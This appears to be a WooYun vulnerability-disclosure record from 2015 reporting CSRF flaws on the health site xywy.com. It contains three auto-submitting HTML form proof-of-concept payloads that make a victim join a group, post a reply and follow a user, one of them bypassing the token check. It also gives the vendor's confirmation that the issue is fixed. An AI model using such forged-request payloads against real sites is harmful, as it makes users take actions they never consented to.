{"id": 28079, "wybug_id": "wooyun-2015-0123599", "wybug_title": "寻医问药可CSRF发表回复、刷关注", "wybug_corp": "寻医问药", "wybug_author": "jeary", "wybug_date": "2015-06-30 12:08", "wybug_open_date": "2015-08-11 14:17", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-11：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： :） 详细说明：  存在CSRF的功能如图：\n\n\n\n\n\nPOC（加入圈子）：\n<html>   <body>    <form action=\"http://home.xywy.com/user.php?act=addgroup\" method=\"POST\">      <input type=\"hidden\" name=\"gid\" value=\"37\" />      <input type=\"hidden\" name=\"gpinyin\" value=\"jianfei\" />      <input type=\"hidden\" name=\"type\" value=\"1\" />      <input type=\"hidden\" name=\"uppage\" value=\"http&#58;&#47;&#47;home&#46;xywy&#46;com&#47;jianfei&#47;\" />      <input type=\"hidden\" name=\"ill\" value=\"\" />          </form>    <script>      document.forms[0].submit();    </script>  </body></html>\nPOC：(发表回复)\n<html>   <body>    <form action=\"http://home.xywy.com/jianfei/703108.html\" method=\"POST\">      <input type=\"hidden\" name=\"content\" value=\"æ&#153;&#154;ä&#184;&#138;ç&#157;&#161;ä&#184;&#141;ç&#157;&#128;å&#149;&#138;ã&#128;&#130;\" />      <input type=\"hidden\" name=\"themeid\" value=\"703108\" />      <input type=\"hidden\" name=\"replyid\" value=\"0\" />      <input type=\"hidden\" name=\"type\" value=\"theme\" />          </form>    <script>      document.forms[0].submit();    </script>  </body></html>\nPOC（关注他人[ps：本来是有token的，但是删除token参数后继续请求，依然可以关注]）：\n<html>  <body>    <form action=\"http://home.xywy.com/user.php\">      <input type=\"hidden\" name=\"act\" value=\"attention\" />      <input type=\"hidden\" name=\"uid\" value=\"10526606\" />      <input type=\"hidden\" name=\"type\" value=\"atten\" />          </form>    <script>      document.forms[0].submit();    </script>  </body></html>\n   漏洞证明：  见详细   修复方案：     版权声明：转载请注明来源 jeary@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-06-30 19:32 厂商回复： token这个梗，其实以前跟开发反应过，相应的我们会加强在csrf的防御。 最新状态： 2015-08-11：漏洞已修复。  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}